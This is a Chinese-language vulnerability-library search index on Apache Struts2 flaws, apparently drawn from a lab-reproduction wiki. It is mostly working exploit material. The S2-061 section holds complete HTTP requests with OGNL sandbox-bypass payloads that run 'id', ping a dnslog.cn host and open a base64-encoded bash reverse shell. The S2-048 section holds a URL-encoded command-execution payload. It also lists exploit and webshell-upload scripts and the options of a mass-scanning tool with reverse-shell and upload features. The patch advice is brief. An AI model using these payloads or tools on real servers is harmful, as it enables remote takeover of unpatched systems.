\u5373\u53ef\u9020\u6210OGNL\u8868\u8fbe\u5f0f\u6267\u884c\u3002S2-061\u662f\u5bf9S2-059\u6c99\u76d2\u8fdb\u884c\u7684\u7ed5\u8fc7\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2-061/#0x02","title":"0x02 \u6f0f\u6d1e\u5f71\u54cd","text":"<p>struts 2.0.0 - struts 2.5.25</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2-061/#0x03","title":"0x03 \u6f0f\u6d1e\u590d\u73b0","text":"<p>\u4e00.\u73af\u5883\u642d\u5efa</p> <p>1.docker\u73af\u5883\u5730\u5740\uff1a</p> <p>https://github.com/vulhub/vulhub/tree/master/struts2/s2-061</p> <p>docker-compose up -d #\u542f\u52a8docker\u73af\u5883</p> <pre><code>2.\u8bbf\u95ee\u76ee\u6807\u5730\u5740\nhttp://192.168.1.14:8080/index.action\n\u4e8c\u3001\u6f0f\u6d1e\u5229\u7528\n1.DNSlog\u9a8c\u8bc1\u6f0f\u6d1e\n</code></pre> <pre><code>POST /index.action HTTP/1.1\nHost: 192.168.1.14:8080\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36\nConnection: close\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF\nContent-Length: 853\n\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF\n\nContent-Disposition: form-data; name=\"id\"\n\n%{(#instancemanager=#application[\"org.apache.tomcat.InstanceManager\"]).(#stack=#attr[\"com.opensymphony.xwork2.util.ValueStack.ValueStack\"]).(#bean=#instancemanager.newInstance(\"org.apache.commons.collections.BeanMap\")).(#bean.setBean(#stack)).(#context=#bean.get(\"context\")).(#bean.setBean(#context)).(#macc=#bean.get(\"memberAccess\")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(\"java.util.HashSet\")).(#bean.put(\"excludedClasses\",#emptyset)).(#bean.put(\"excludedPackageNames\",#emptyset)).(#arglist=#instancemanager.newInstance(\"java.util.ArrayList\")).(#arglist.add(\"ping    paqmgs.dnslog.cn\")).(#execute=#instancemanager.newInstance(\"freemarker.template.utility.Execute\")).(#execute.exec(#arglist))}\n\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF--\n</code></pre> <p>DNGlog\u8bb0\u5f55\u53ef\u53d1\u73b0\u547d\u4ee4\u6210\u529f\u6267\u884c</p> <p></p> <p>2.\u901a\u8fc7\u6784\u9020post\u5305\u6267\u884cexp \u547d\u4ee4\u6267\u884cid</p> <pre><code>POST /index.action HTTP/1.1\nHost: 192.168.1.14:8080\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36\nConnection: close\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF\nContent-Length: 827\n\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF\n\nContent-Disposition: form-data; name=\"id\"\n\n%{(#instancemanager=#application[\"org.apache.tomcat.InstanceManager\"]).(#stack=#attr[\"com.opensymphony.xwork2.util.ValueStack.ValueStack\"]).(#bean=#instancemanager.newInstance(\"org.apache.commons.collections.BeanMap\")).(#bean.setBean(#stack)).(#context=#bean.get(\"context\")).(#bean.setBean(#context)).(#macc=#bean.get(\"memberAccess\")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(\"java.util.HashSet\")).(#bean.put(\"excludedClasses\",#emptyset)).(#bean.put(\"excludedPackageNames\",#emptyset)).(#arglist=#instancemanager.newInstance(\"java.util.ArrayList\")).(#arglist.add(\"id\")).(#execute=#instancemanager.newInstance(\"freemarker.template.utility.Execute\")).(#execute.exec(#arglist))}\n\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF--\n</code></pre> <p>burp\u63d0\u4ea4\u540e\uff0c\u5728\u54cd\u5e94\u9875\u9762\u53d1\u73b0\u547d\u4ee4\u56de\u663e\u53ef\uff0c\u8bf4\u660eID\u547d\u4ee4\u6267\u884c\u6210\u529f</p> <p></p> <p>\u6216\u8005</p> <pre><code>POST /index.action HTTP/1.1\nHost: 192.168.1.14:8080\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36\nConnection: close\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF\nContent-Length: 1361\n\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF\n\nContent-Disposition: form-data; name=\"id\"\n\n%{\n\n(#request.map=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) + \n\n(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) + \n\n(#request.map2=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) +\n\n(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) + \n\n(#request.map3=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) + \n\n(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) + \n\n(#request.get('map3').put('excludedPackageNames',#application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet')) == true).toString().substring(0,0) + \n\n(#request.get('map3').put('excludedClasses',#application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet')) == true).toString().substring(0,0) +\n\n(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'id'}))\n\n}\n\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF--\n</code></pre> <p></p> <p>3.\u53cd\u5f39shell\u547d\u4ee4</p> <p>\u901a\u8fc7\u4ee5\u4e0b\u5728\u7ebf\u5730\u5740\u5c06bash\u53cd\u5f39\u547d\u4ee4\u8fdb\u884c\u8fdb\u884c\u7f16\u7801\u8f6c\u6362</p> <p>http://www.jackson-t.ca/runtime-exec-payloads.html</p> <p></p> <p>\u63d0\u4ea4\u4ee5\u4e0bpoc:</p> <pre><code>POST /index.action HTTP/1.1\nHost: 192.168.1.14:8080\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36\nConnection: close\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF\nContent-Length: 922\n\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF\n\nContent-Disposition: form-data; name=\"id\"\n\n%{(#instancemanager=#application[\"org.apache.tomcat.InstanceManager\"]).(#stack=#attr[\"com.opensymphony.xwork2.util.ValueStack.ValueStack\"]).(#bean=#instancemanager.newInstance(\"org.apache.commons.collections.BeanMap\")).(#bean.setBean(#stack)).(#context=#bean.get(\"context\")).(#bean.setBean(#context)).(#macc=#bean.get(\"memberAccess\")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(\"java.util.HashSet\")).(#bean.put(\"excludedClasses\",#emptyset)).(#bean.put(\"excludedPackageNames\",#emptyset)).(#arglist=#instancemanager.newInstance(\"java.util.ArrayList\")).(#arglist.add(\"bash -c  {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTQvMjIyMiAgIDA+JjE=}|{base64,-d}|{bash,-i}\")).(#execute=#instancemanager.newInstance(\"freemarker.template.utility.Execute\")).(#execute.exec(#arglist))}\n\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF--\n</code></pre> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u6210\u529f\u53cd\u5f39shell:</p> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2-061/#0x04","title":"0x04 \u6f0f\u6d1e\u4fee\u590d","text":"<p>\u907f\u514d\u5bf9\u4e0d\u53d7\u4fe1\u4efb\u7684\u7528\u6237\u8f93\u5165\u4f7f\u7528\u5f3a\u5236OGNL\u8bc4\u4f30\uff0c\u6216/\u548c\u5347\u7ea7\u52302.5.26\u7248\uff0c\u53ef\u4fee\u590d\u8be5\u6f0f\u6d1e\u3002\u817e\u8baf\u5b89\u5168\u4e13\u5bb6\u5efa\u8bae\u53d7\u5f71\u54cd\u7684\u7528\u6237\u5c06Apache Struts\u6846\u67b6\u5347\u7ea7\u81f3\u6700\u65b0\u7248\u672c</p> <p>\u4e34\u65f6\u4fee\u590d\uff0c\u5347\u7ea7\u5230 Struts 2.5.26 \u7248\u672c\uff0c\u4e0b\u8f7d\u5730\u5740\u4e3a\uff1a</p> <p>https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.5.26</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2-061/#0x05","title":"0x05 \u6f0f\u6d1e\u603b\u7ed3","text":"<p>\u6b64\u6b21\u6f0f\u6d1e\u53ea\u662fS2-059\u4fee\u590d\u7684\u4e00\u4e2a\u7ed5\u8fc7\uff0c\u5e76\u4e14\u672c\u6b21\u5229\u7528\u7684\u6838\u5fc3\u7c7borg.apache.commons.collections.BeanMap\u5728commons-collections-x.x.jar\u5305\u4e2d\uff0c\u4f46\u662f\u5728\u5b98\u65b9\u7684\u6700\u5c0f\u4f9d\u8d56\u5305\u4e2d\u5e76\u6ca1\u6709\u5305\u542b\u8fd9\u4e2a\u5305\u3002\u6240\u4ee5\u5373\u4f7f\u626b\u5230\u4e86\u652f\u6301OGNL\u8868\u8fbe\u5f0f\u7684\u6ce8\u5165\u70b9\uff0c\u4f46\u662f\u5982\u679c\u6ca1\u6709\u4f7f\u7528\u8fd9\u4e2a\u4f9d\u8d56\u5305\uff0c\u4e5f\u8fd8\u662f\u6ca1\u529e\u6cd5\u8fdb\u884c\u5229\u7528\u3002</p> <p>\u6765\u6e90\u7f51\u7edc https://www.cnblogs.com/backlion/p/14122528.html</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/readme/","title":"About Apache Struts2","text":"<p>xxxxx</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/readme/#vulnerability-list","title":"Vulnerability list","text":"<p>struts2-032_cmd.py Struts2 method \u4efb\u610f\u4ee3\u7801\u6267\u884c\u6f0f\u6d1eGetShell\u5229\u7528\u811a\u672c(CVE-2016-3081) struts2-032_poc.py Struts2 method \u4efb\u610f\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u68c0\u6d4b\u811a\u672c(CVE-2016-3081)   struts2-045_cmd.py Struts2 Jakarta Multipart parser \u63d2\u4ef6\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u5229\u7528\u811a\u672c1(CVE-2017-5638)[\u4f7f\u7528] struts2-045-2_cmd.py   Struts2 Jakarta Multipart parser \u63d2\u4ef6\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u5229\u7528\u811a\u672c2(CVE-2017-5638)[\u4f7f\u7528] struts2-052_cmd.py Struts2 REST \u63d2\u4ef6\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u5229\u7528\u811a\u672c(CVE-2017-9805) struts2-052_webshell.py Struts2 REST \u63d2\u4ef6\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u4e0a\u4f20Webshell\u811a\u672c(CVE-2017-9805) struts2-053_cmd.py Struts2 Freemarker \u6807\u7b7e\u8fdc\u7a0b\u6267\u884c\u547d\u4ee4\u6f0f\u6d1e\u5229\u7528\u811a\u672c(CVE-2017-12611) struts2-057_cmd.py Struts2 Namespace \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u5229\u7528\u811a\u672c(CVE-2018-11776)  </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/readme/#readme","title":"Readme","text":"<p>\u90e8\u5206\u811a\u672c\u6587\u4ef6\u4f7f\u7528\u8bf4\u660e\uff0c\u8be6\u7ec6\u4f7f\u7528\u5206\u6790\u8bf7\u53c2\u8003vulnerability-list\u4e2d\u7684[\u4f7f\u7528] - VER: \u6f0f\u6d1e\u5f71\u54cd\u7248\u672c\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\u4e0d\u5728\u5f71\u54cd\u8303\u56f4\u7684\u7248\u672c\u6ca1\u6709\u76f8\u5173\u6f0f\u6d1e - USE: \u811a\u672c\u6587\u4ef6\u4f7f\u7528\u8bf4\u660e\uff0c\u5927\u90e8\u5206\u5199\u5728\u4e86\u811a\u672c\u91cc\uff0c\u6267\u884c\u5373\u53ef\u89c1 - EXP: \u811a\u672c\u5229\u7528\u793a\u4f8b\uff0c\u4ee5\u53ca\u6267\u884c\u6548\u679c - DES: \u90e8\u5206\u7279\u6b8a\u811a\u672c\u6587\u4ef6\u7684\u7279\u6b8a\u63cf\u8ff0</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/S2-048%28CVE-2017-9791%29/","title":"S2-048(CVE-2017-9791)","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/S2-048%28CVE-2017-9791%29/#affected-version","title":"Affected Version","text":"<p>Struts 2.3.x</p> <p>\u6b64\u5916\u9700\u8981\u6ee1\u8db3\u4e0b\u9762\u7684\u6761\u4ef6\uff1a</p> <ol> <li>\u8c03\u7528\u975e\u9ed8\u8ba4\u63d2\u4ef6 struts2-struts1-plugin.jar</li> <li> <p>\u4ee3\u7801\u4e2d\u521b\u5efa ActionMessage \u5bf9\u8c61\u4f7f\u7528 \u5b57\u7b26\u4e32\u62fc\u63a5\u7684\u5f62\u5f0f\uff0c\u5982\u4e0b\uff1a</p> <p>messages.add(\"msg\", new ActionMessage(\"Gangster \" + gform.getName() + \" was added\"));</p> </li> </ol>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/S2-048%28CVE-2017-9791%29/#poc","title":"poc","text":"<p>\u6f0f\u6d1e\u73af\u5883\u4f7f\u7528 Struts-2.3.32 \u7248\u672c \u7684 showcase \u5e94\u7528 </p> <p>Py \u811a\u672c\u9a8c\u8bc1 (poc.py)</p> <p></p> <p>Forefox Hackbar \u9a8c\u8bc1\uff1a</p> <p>POST \u6570\u636e\u5305\uff1a</p> <pre><code>age=1&amp;cmd=echo Affected by S2-048&amp;__checkbox_bustedBefore=true&amp;name=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%23parameters.cmd%5B0%5D%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2Fc%27%2C%23cmd%7D%3A%7B%27%2Fbin%2Fbash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getOutputStream%28%29%29%29.%28%40org.apache.commons.io.IOUtils%40copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D&amp;description=test\n</code></pre> <p>\u7ed3\u679c\uff1a</p> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/S2-048%28CVE-2017-9791%29/#references","title":"References","text":"<ol> <li>https://cwiki.apache.org/confluence/display/WW/S2-048</li> <li>https://github.com/Medicean/VulApps/tree/master/s/struts2/s2-048</li> </ol>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2-Scan/","title":"Struts2-Scan","text":"<ul> <li>Struts2\u6f0f\u6d1e\u5229\u7528\u626b\u63cf\u5de5\u5177\uff0c\u57fa\u4e8e\u4e92\u8054\u7f51\u4e0a\u5df2\u7ecf\u516c\u5f00\u7684Structs2\u9ad8\u5371\u6f0f\u6d1eexp\u7684\u626b\u63cf\u5229\u7528\u5de5\u5177\uff0c\u76ee\u524d\u652f\u6301\u7684\u6f0f\u6d1e\u5982\u4e0b: S2-001, S2-003, S2-005, S2-007, S2-008, S2-009, S2-012, S2-013, S2-015, S2-016, S2-019, S2-029, S2-032, S2-033, S2-037, S2-045, S2-046, S2-048, S2-052, S2-053, S2-devMode, S2-057</li> <li>\u652f\u6301\u5355\u4e2aURL\u6f0f\u6d1e\u68c0\u6d4b\u548c\u6279\u91cfURL\u68c0\u6d4b\uff0c\u81f3\u6b64\u6307\u5b9a\u6f0f\u6d1e\u5229\u7528\uff0c\u53ef\u83b7\u53d6WEB\u8def\u5f84\uff0c\u6267\u884c\u547d\u4ee4\uff0c\u53cd\u5f39shell\u548c\u4e0a\u4f20\u6587\u4ef6\uff0c\u6ce8\u610f\uff0c\u5e76\u4e0d\u662f\u6240\u6709\u7684\u6f0f\u6d1e\u5747\u652f\u6301\u4e0a\u8ff0\u529f\u80fd\uff0c\u53ea\u6709\u90e8\u5206\u529f\u80fd\u652f\u6301</li> <li>\u5982\u6709\u9519\u8bef\u6216\u8005\u95ee\u9898\u6b22\u8fce\u5927\u5bb6\u63d0\u95ee\u4ea4\u6d41\uff0c\u4e00\u8d77\u89e3\u51b3</li> </ul>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2-Scan/#_1","title":"\u8fd0\u884c\u73af\u5883","text":"<ul> <li>Python3.6.X\u53ca\u5176\u4ee5\u4e0a\u7248\u672c</li> <li>\u7b2c\u4e09\u65b9\u5e93: click, requests, bs4</li> <li>\u6d4b\u8bd5\u73af\u5883: Ubuntu 16.04</li> <li>\u6f0f\u6d1e\u73af\u5883\u5df2\u4e0a\u4f20\uff0c\u53c2\u8003\u5730\u5740\uff1a<ul> <li>https://github.com/Medicean/VulApps/tree/master/s/struts2/</li> <li>https://github.com/vulhub/vulhub/tree/master/struts2</li> </ul> </li> </ul>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2-Scan/#_2","title":"\u5de5\u5177\u53c2\u6570\u8bf4\u660e","text":"<pre><code>Usage: Struts2Scan.py [OPTIONS]\n\n  Struts2\u6279\u91cf\u626b\u63cf\u5229\u7528\u5de5\u5177\n\nOptions:\n  -i, --info          \u6f0f\u6d1e\u4fe1\u606f\u4ecb\u7ecd\n  -v, --version       \u663e\u793a\u5de5\u5177\u7248\u672c\n  -u, --url TEXT      URL\u5730\u5740\n  -n, --name TEXT     \u6307\u5b9a\u6f0f\u6d1e\u540d\u79f0, \u6f0f\u6d1e\u540d\u79f0\u8be6\u89c1info\n  -f, --file TEXT     \u6279\u91cf\u626b\u63cfURL\u6587\u4ef6, \u4e00\u884c\u4e00\u4e2aURL\n  -d, --data TEXT     POST\u53c2\u6570, \u9700\u8981\u4f7f\u7528\u7684payload\u4f7f\u7528{exp}\u586b\u5145, \u5982: name=test&amp;passwd={exp}\n  -c, --encode TEXT   \u9875\u9762\u7f16\u7801, \u9ed8\u8ba4UTF-8\u7f16\u7801\n  -p, --proxy TEXT    HTTP\u4ee3\u7406. \u683c\u5f0f\u4e3ahttp://ip:port\n  -t, --timeout TEXT  HTTP\u8d85\u65f6\u65f6\u95f4, \u9ed8\u8ba410s\n  -w, --workers TEXT  \u6279\u91cf\u626b\u63cf\u8fdb\u7a0b\u6570, \u9ed8\u8ba4\u4e3a10\u4e2a\u8fdb\u7a0b\n  --header TEXT       HTTP\u8bf7\u6c42\u5934, \u683c\u5f0f\u4e3a: key1=value1&amp;key2=value2\n  -e, --exec          \u8fdb\u5165\u547d\u4ee4\u6267\u884cshell\n  --webpath           \u83b7\u53d6WEB\u8def\u5f84\n  -r, --reverse TEXT  \u53cd\u5f39shell\u5730\u5740, \u683c\u5f0f\u4e3aip:port\n  --upfile TEXT       \u9700\u8981\u4e0a\u4f20\u7684\u6587\u4ef6\u8def\u5f84\u548c\u540d\u79f0\n  --uppath TEXT       \u4e0a\u4f20\u7684\u76ee\u5f55\u548c\u540d\u79f0, \u5982: /usr/local/tomcat/webapps/ROOT/shell.jsp\n  -q, --quiet         \u5173\u95ed\u6253\u5370\u4e0d\u5b58\u5728\u6f0f\u6d1e\u7684\u8f93\u51fa\uff0c\u53ea\u4fdd\u7559\u5b58\u5728\u6f0f\u6d1e\u7684\u8f93\u51fa\n  -h, --help          Show this message and exit.\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2-Scan/#_3","title":"\u4f7f\u7528\u4f8b\u5b50","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Struts2/Struts2-Scan/#_4","title":"\u67e5\u770b\u6f0f\u6d1e\u8be6\u7ec6\u4fe1\u606f:","text":"<pre><code>$ python3 Struts2Scan.py --info\n\n ____  _              _       ____    ____                  \n/ ___|| |_ _ __ _   _| |_ ___|___ \\  / ___|  ___ __ _ _ __  \n\\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ \n ___) | |_| |  | |_| | |_\\__ \\/ __/   ___) | (_| (_| | | | |\n|____/ \\__|_|   \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_|\n\n                                      Author By HatBoy        \n\n[+] \u652f\u6301\u5982\u4e0bStruts2\u6f0f\u6d1e:\n[+] S2-001:\u5f71\u54cd\u7248\u672cStruts 2.0.0-2.0.8; POST\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u9ed8\u8ba4\u53c2\u6570\u4e3a:username,password; \u652f\u6301\u83b7\u53d6WEB\u8def\u5f84,\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell\n[+] S2-003:\u5f71\u54cd\u7248\u672cStruts 2.0.0-2.0.11.2; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u4efb\u610f\u547d\u4ee4\u6267\u884c\n[+] S2-005:\u5f71\u54cd\u7248\u672cStruts 2.0.0-2.1.8.1; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u83b7\u53d6WEB\u8def\u5f84,\u4efb\u610f\u547d\u4ee4\u6267\u884c\n[+] S2-007:\u5f71\u54cd\u7248\u672cStruts 2.0.0-2.2.3; POST\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u9ed8\u8ba4\u53c2\u6570\u4e3a:username,password; \u652f\u6301\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell\n[+] S2-008:\u5f71\u54cd\u7248\u672cStruts 2.1.0-2.3.1; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell\n[+] S2-009:\u5f71\u54cd\u7248\u672cStruts 2.0.0-2.3.1.1; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e,URL\u540e\u9762\u9700\u8981\u8bf7\u6c42\u53c2\u6570\u540d; \u9ed8\u8ba4\u4e3a: key; \u652f\u6301\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell\n[+] S2-012:\u5f71\u54cd\u7248\u672cStruts Showcase App 2.0.0-2.3.13; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e,\u53c2\u6570\u76f4\u63a5\u6dfb\u52a0\u5230URL\u540e\u9762; \u9ed8\u8ba4\u4e3a:name; \u652f\u6301\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell\n[+] S2-013/S2-014:\u5f71\u54cd\u7248\u672cStruts 2.0.0-2.3.14.1; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u83b7\u53d6WEB\u8def\u5f84,\u4efb\u610f\u547d\u4ee4\u6267\u884c,\u53cd\u5f39shell\u548c\u6587\u4ef6\u4e0a\u4f20\n[+] S2-015:\u5f71\u54cd\u7248\u672cStruts 2.0.0-2.3.14.2; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell\n[+] S2-016:\u5f71\u54cd\u7248\u672cStruts 2.0.0-2.3.15; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u83b7\u53d6WEB\u8def\u5f84,\u4efb\u610f\u547d\u4ee4\u6267\u884c,\u53cd\u5f39shell\u548c\u6587\u4ef6\u4e0a\u4f20\n[+] S2-019:\u5f71\u54cd\u7248\u672cStruts 2.0.0-2.3.15.1; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u83b7\u53d6WEB\u8def\u5f84,\u4efb\u610f\u547d\u4ee4\u6267\u884c,\u53cd\u5f39shell\u548c\u6587\u4ef6\u4e0a\u4f20\n[+] S2-029:\u5f71\u54cd\u7248\u672cStruts 2.0.0-2.3.24.1(\u9664\u4e862.3.20.3); POST\u8bf7\u6c42\u53d1\u9001\u6570\u636e,\u9700\u8981\u53c2\u6570; \u9ed8\u8ba4\u53c2\u6570:message; \u652f\u6301\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell\n[+] S2-032:\u5f71\u54cd\u7248\u672cStruts 2.3.20-2.3.28(\u9664\u4e862.3.20.3\u548c2.3.24.3); GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u83b7\u53d6WEB\u8def\u5f84,\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell\n[+] S2-033:\u5f71\u54cd\u7248\u672cStruts 2.3.20-2.3.28(\u9664\u4e862.3.20.3\u548c2.3.24.3); GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell\n[+] S2-037:\u5f71\u54cd\u7248\u672cStruts 2.3.20-2.3.28.1; GET\u8bf7\u6c42\u53d1\u9001\u6570\u636e; \u652f\u6301\u83b7\u53d6WEB\u8def\u5f84,\u4efb\u610f\u547d\u4ee4\u6267\u884c\u548c\u53cd\u5f39shell\n[+] S2-045:\u5f71\u54cd\u7248\u672cStruts 2.3.5-2.3.31,2.5-2.5.10; POST\u8bf7\u6c42\u53d1\u9001\u6570\u636e,\u4e0d\u9700\u8981\u53c2\u6570; \u652f\u6301\u83b7\u53d6WEB\u8def\u5f84,\u4efb\u610f\u547d\u4ee4\u6267\u884c,\u53cd\u5f39shell\u548c\u6587\u4ef6\u4e0a\u4f20\n[+] S2-046:\u5f71\u54cd\u7248\u672cStruts 2.3.5-2.3.31,2.5-2.5.10; 